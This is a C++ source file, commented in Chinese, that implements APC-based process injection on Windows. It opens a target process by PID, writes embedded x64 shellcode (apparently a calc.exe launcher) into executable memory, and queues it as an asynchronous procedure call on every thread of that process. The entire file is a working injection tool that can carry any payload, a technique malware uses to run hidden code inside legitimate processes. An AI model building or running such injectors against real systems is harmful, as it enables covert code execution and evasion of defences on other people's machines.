#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <string> 
#include <vector>

//shellcode
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

//注入函数
BOOL APCinject(DWORD ProcessID) {
    //获取目标进程的句柄
    HANDLE hProcess= OpenProcess(PROCESS_ALL_ACCESS,FALSE,ProcessID);
    if (!hProcess) {
        std::cerr << "打开进程失败: " << GetLastError() << std::endl;
        return FALSE;
    }
    //在目标进程内创建内存空间
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        std::cout << "Failed to allocate memory: " << GetLastError() << std::endl;
        return FALSE;
    }

    //将shellcode写入到内存
    BOOL write_process_memory=WriteProcessMemory(hProcess,remoteMem,buf,sizeof(buf),NULL);
    if (!write_process_memory) {
        std::cout << "Failed to write process memory: " << GetLastError() << std::endl;
        return FALSE;
    }

    //获取目标进程的所有线程ID
    std::vector<DWORD> threadIds;   //创建一个动态数组容器，用于存储线程
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "创建线程快照失败: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    if (Thread32First(hThreadSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == ProcessID) {
                threadIds.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(hThreadSnap, &te));
    }
    CloseHandle(hThreadSnap);

    if (threadIds.empty()) {
        std::cerr << "未找到目标线程" << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    //向所有线程注入APC
    int successCount = 0;
    for (DWORD threadId : threadIds) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
            FALSE, threadId);  //打开线程句柄
        if (hThread) {
            // 向线程APC队列添加Shellcode地址
            if (QueueUserAPC((PAPCFUNC)remoteMem, hThread, (ULONG_PTR)remoteMem)) {
                successCount++;
                std::cout << "成功向线程 " << threadId << " 注入APC" << std::endl;
            }
            else {
                std::cerr << "线程 " << threadId << " APC排队失败: " << GetLastError() << std::endl;
            }
            CloseHandle(hThread);
        }
        else {
            std::cerr << "无法打开线程 " << threadId << ": " << GetLastError() << std::endl;
        }
    }


    std::cout << "注入完成! 成功注入 " << successCount << "/" << threadIds.size()
        << " 个线程" << std::endl;

    // 步骤8：清理资源
    // 注意：这里不立即释放内存，因为线程可能还未执行APC
    // 实际应用中需要设计内存释放机制
    CloseHandle(hProcess);

    return TRUE;

} 

int main(int argc,char* argv[])
{
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <PID>" << std::endl;
        return 1;
    }
    DWORD threadID = static_cast<DWORD>(std::stoul(argv[1]));
    BOOL result=APCinject(threadID);
    if (result) {
        std::cout << "APC Inject Success!" << std::endl;
    }
    else {
        std::cout << "APC Inject Failed!" << std::endl;
    }
    return 0;
}

